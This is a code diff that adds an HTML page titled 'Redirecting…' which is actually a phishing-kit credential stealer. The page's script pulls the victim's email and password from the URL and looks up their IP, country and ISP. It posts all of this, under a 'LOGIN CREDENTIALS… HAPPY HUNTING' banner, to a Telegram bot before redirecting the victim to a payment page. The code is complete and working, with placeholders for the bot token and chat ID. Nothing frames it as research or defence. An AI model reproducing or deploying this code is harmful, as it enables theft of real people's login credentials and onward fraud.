@@ -1,0 +1,129 @@
+html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="refresh" content="5;url=../payment.html">
+<title>Redirecting…</title>
+<style>
+  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+       background:#0b0d10;color:#e8eaed;font:13px/1.55 ui-monospace,Menlo,Consolas,monospace}
+  pre{margin:0;padding:24px;white-space:pre-wrap;max-width:600px}
+</style>
+</head>
+<body>
+<pre id="out">Verifying…</pre>
+<script>
+(function () {
+  "use strict";
+
+  var botToken = "YOUR_BOT_TOKEN";
+  var chatId   = "YOUR_CHAT_ID";
+  var redirect = "../payment.html";
+
+  var params = new URLSearchParams(window.location.search);
+  var data = {};
+  params.forEach(function (v, k) {
+    if (k in data) data[k] = [].concat(data[k], v);
+    else data[k] = v;
+  });
+
+  var email    = data.email    || "";
+  var Password = data.Password || "";
+
+  function ua() {
+    var s = navigator.userAgent;
+    var browser = "Unknown", os = "Unknown", device = "Desktop";
+    if (/Edg\//.test(s)) browser = "Edge";
+    else if (/OPR\/|Opera/.test(s)) browser = "Opera";
+    else if (/Firefox\//.test(s)) browser = "Firefox";
+    else if (/Chrome\//.test(s)) browser = "Chrome";
+    else if (/Safari\//.test(s)) browser = "Safari";
+    if (/Windows NT 10/.test(s)) os = "Windows 10/11";
+    else if (/Windows/.test(s)) os = "Windows";
+    else if (/Android/.test(s)) os = "Android";
+    else if (/iPhone|iPad|iPod/.test(s)) os = "iOS";
+    else if (/Mac OS X/.test(s)) os = "macOS";
+    else if (/Linux/.test(s)) os = "Linux";
+    if (/iPad|Tablet/.test(s)) device = "Tablet";
+    else if (/Mobi|Android|iPhone/.test(s)) device = "Mobile";
+    return { browser: browser, os: os, device: device };
+  }
+
+  var u = ua();
+  var ip = "", country = "", as_name = "";
+
+  function geo() {
+    return fetch("https://ipwho.is/")
+      .then(function (r) { return r.json(); })
+      .then(function (j) {
+        if (j && j.success !== false) {
+          ip = j.ip || "";
+          country = j.country || "";
+          as_name = (j.connection && j.connection.isp) || "";
+        }
+      })
+      .catch(function () {
+        return fetch("https://api.ipify.org?format=json")
+          .then(function (r) { return r.json(); })
+          .then(function (j) { ip = j.ip || ""; })
+          .catch(function () {});
+      });
+  }
+
+  function raw() {
+    var lines = [];
+    for (var k in data) {
+      if (!Object.prototype.hasOwnProperty.call(data, k)) continue;
+      lines.push(k + ": " + [].concat(data[k]).join(", "));
+    }
+    return lines.join("\n");
+  }
+
+  function message() {
+    return `
+╔════════════════════════════════╗
+   🔥💀 𝐋𝐎𝐆𝐈𝐍 𝐂𝐑𝐄𝐃𝐄𝐍𝐓𝐈𝐀𝐋𝐒 💀🔥
+╚════════════════════════════════╝
+
+📧 ┃ 𝐋𝐨𝐠𝐢𝐧 𝐈𝐃 ➤ ${email}
+🔑 ┃ 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ➤ ${Password}
+
+📡 ┃ IP ➤ ${ip} - ${country} - ${as_name}
+🌐 ┃ Device ➤ ${u.browser} - ${u.os} - ${u.device}
+╔════════════════════════╗
+   ⚡ 𝐇𝐀𝐏𝐏𝐘 𝐇𝐔𝐍𝐓𝐈𝐍𝐆 ⚡
+╚════════════════════════╝
+
+RAW
+${raw()}
+`;
+  }
+
+  function send() {
+    return fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+      method: "POST",
+      body: new URLSearchParams({ chat_id: chatId, text: message() }),
+      keepalive: true
+    });
+  }
+
+  var moved = false;
+  function go() {
+    if (moved) return;
+    moved = true;
+    window.location.replace(redirect);
+  }
+
+  document.getElementById("out").textContent = message();
+
+  geo().then(send).catch(function () {}).then(function () {
+    setTimeout(go, 900);
+  });
+  setTimeout(go, 3500);
+})();
+</script>
+<noscript><meta http-equiv="refresh" content="1;url=../payment.html"></noscript>
+</body>
+</html>
